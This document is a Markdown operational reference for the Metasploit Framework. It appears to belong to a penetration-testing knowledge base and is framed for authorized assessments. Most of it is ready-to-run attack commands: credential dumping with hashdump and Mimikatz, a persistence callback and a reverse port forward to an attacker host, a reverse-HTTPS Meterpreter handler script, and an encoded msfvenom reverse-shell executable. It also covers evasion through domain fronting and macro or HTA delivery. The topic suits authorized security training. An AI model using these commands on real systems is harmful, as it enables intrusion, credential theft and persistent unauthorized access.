# Metasploit Framework Reference

## Purpose

Operational reference for the Metasploit Framework, the premier open-source penetration testing platform. Covers module architecture, payload selection, post-exploitation techniques, pivoting, and resource script automation for authorized security assessments.

## Architecture Overview

### Module Types

| Module Type | Path | Purpose |
|-------------|------|---------|
| Exploits | `exploit/` | Deliver payloads via vulnerabilities |
| Auxiliary | `auxiliary/` | Scanners, fuzzers, info gathering (no payload) |
| Post | `post/` | Post-exploitation on active sessions |
| Payloads | `payload/` | Code to execute on target |
| Encoders | `encoder/` | Obfuscate payloads to evade detection |
| Nops | `nop/` | NOP sled generators for exploit stability |
| Evasion | `evasion/` | AV/EDR evasion modules |

### Console Essentials

```
msfconsole                        # Launch console
db_status                         # Verify database connection
workspace -a engagement_name      # Create workspace
db_nmap -sS -sV -T4 target       # Nmap with auto-import
hosts                             # List discovered hosts
services                          # List discovered services
vulns                             # List vulnerabilities
search type:exploit platform:windows smb  # Search modules
use exploit/windows/smb/ms17_010_eternalblue
info                              # Module details
show options                      # Required parameters
show payloads                     # Compatible payloads
show targets                      # Target configurations
set RHOSTS 10.0.0.5               # Set target
set LHOST 10.0.0.100              # Set listener
exploit / run                     # Execute
```

## Payload Selection Guide

### Payload Categories

| Category | Example | Use Case |
|----------|---------|----------|
| Singles | `windows/exec` | Self-contained, single stage |
| Stagers | `windows/meterpreter/reverse_tcp` | Small loader + staged download |
| Stageless | `windows/meterpreter_reverse_tcp` | Full payload in one shot (larger but more reliable) |

### Payload Decision Matrix

```
Target has AV? --> Use encrypted/encoded stageless payloads
Unstable connection? --> Use stageless (no second stage to fail)
Tight size constraints? --> Use staged (smaller initial payload)
Need to evade IDS? --> Use reverse_https or reverse_dns
Internal pivot? --> Use bind_tcp on compromised hosts
Highly monitored? --> Use reverse_https with domain fronting
```

### Meterpreter vs Shell

| Feature | Meterpreter | Shell |
|---------|-------------|-------|
| In-memory execution | Yes | No |
| File operations | Built-in | OS commands |
| Pivoting | Built-in | Manual (SSH, chisel) |
| Keystroke capture | Built-in | Requires tools |
| Forensic footprint | Minimal | Higher |
| AV detection risk | Higher (known signatures) | Lower |

## Post-Exploitation (Meterpreter)

### Essential Commands

```
# System information
sysinfo                           # OS, hostname, arch
getuid                            # Current user context
getpid                            # Current process ID
ps                                # Process listing

# Privilege escalation
getsystem                         # Attempt SYSTEM via known techniques
run post/multi/recon/local_exploit_suggester  # Find privesc vectors

# Credential harvesting
hashdump                          # Dump SAM hashes (requires SYSTEM)
load kiwi                         # Load Mimikatz extension
creds_all                         # All credentials in memory
kerberos_ticket_list              # Kerberos tickets
lsa_dump_sam                      # SAM database dump

# Persistence
run persistence -U -i 30 -p 4444 -r attacker_ip
run post/windows/manage/enable_rdp

# Lateral movement
run post/windows/manage/psexec_command HOST=target CMD=command

# Network
arp                               # ARP cache
route                             # Routing table
portfwd add -l 8080 -p 80 -r internal_target  # Port forward
```

### Token Manipulation

```
use incognito                     # Load incognito
list_tokens -u                    # List available tokens
impersonate_token "DOMAIN\\Admin" # Impersonate user
rev2self                          # Revert to original token
```

## Pivoting and Routing

### Autoroute

```
# Add route through session
run autoroute -s 10.10.10.0/24
run autoroute -p                  # Print routes

# Use SOCKS proxy for external tools
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
# Then use proxychains with external tools
```

### Port Forwarding

```
# Local port forward
portfwd add -l 3389 -p 3389 -r 10.10.10.5

# Reverse port forward (target connects back)
portfwd add -R -l 8443 -p 443 -L attacker_ip
```

## Resource Scripts

### Automated Scan Script

```ruby
# auto_scan.rc
workspace -a auto_scan
db_nmap -sS -sV -sC -T4 -p- --open <target_range>
vulns
spool /tmp/scan_results.txt
hosts -c address,os_name
services -c port,proto,name,info -S open
spool off
```

### Handler Script

```ruby
# handler.rc
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic
exploit -j
```

### Execution

```bash
msfconsole -r auto_scan.rc
msfconsole -r handler.rc
```

## Evasion Techniques

### Payload Encoding

```
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker LPORT=443 \
  -e x64/xor_dynamic -i 5 \
  -f exe -o payload.exe
```

### Format Flexibility

| Format | Flag | Use Case |
|--------|------|----------|
| EXE | `-f exe` | Direct execution |
| DLL | `-f dll` | DLL sideloading |
| PowerShell | `-f psh` | Fileless execution |
| Python | `-f python` | Cross-platform |
| C | `-f c` | Custom loader development |
| HTA | `-f hta-psh` | Browser-based delivery |
| VBA | `-f vba` | Office macro delivery |

## Database and Reporting

```
# Export findings
db_export -f xml /path/to/results.xml

# Import external scan data
db_import /path/to/nmap_scan.xml
db_import /path/to/nessus_scan.nessus

# Track credentials found
creds                             # List all creds
creds -a 10.0.0.5 -p 445 -u admin -P password  # Add manually
```

## Cross-References

- See `reference/tools/nmap-reference.md` for pre-exploitation reconnaissance
- See `reference/tools/cobalt-strike-reference.md` for advanced C2 operations
- See `frameworks/offense-layer.md` for offensive methodology
- See `frameworks/privilege-escalation-methodology.md` for privesc workflows
- See `frameworks/lateral-movement-methodology.md` for lateral movement strategy
